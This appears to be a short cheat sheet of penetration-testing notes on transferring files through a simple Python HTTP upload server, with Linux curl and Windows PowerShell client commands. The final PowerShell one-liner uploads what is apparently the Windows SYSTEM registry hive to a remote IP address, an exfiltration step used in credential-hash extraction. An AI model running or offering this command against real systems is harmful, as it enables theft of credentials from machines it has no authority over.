# SimpleHTTPServer
https://github.com/Tallguy297/SimpleHTTPServerWithUpload
## Start HTTP Server
### Python
```zsh
python3 ~/github/Tools/FileTrasfer/SimpleHTTPServerWithUploadSimpleHTTPServerWithUpload.py 80
```

### sh
```zsh
~/github/Tools/FileTrasfer/SimpleHTTPServerWithUploadSimpleHTTPServerWithUpload.sh 80
```

# Start HTTPS Server
https://github.com/sgrontflix/simplehttpserverwithupload
```zsh
python3 ~/github/Tools/FileTrasfer/SimpleHTTPServerWithUpload/HTTPS/simplehttpserverwithupload/main.py [-h] [--cgi] [--bind ADDRESS] [--directory DIRECTORY] [--certificate PATH_TO_CERTIFICATE] [port]
```

# Linux Client
```bash
curl -F 'file=@./hoge.txt' http://localhost:8000/
```

# Windows Client
```powershell
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.176:/', 'C:\windows.old\Windows\System32\system')"
```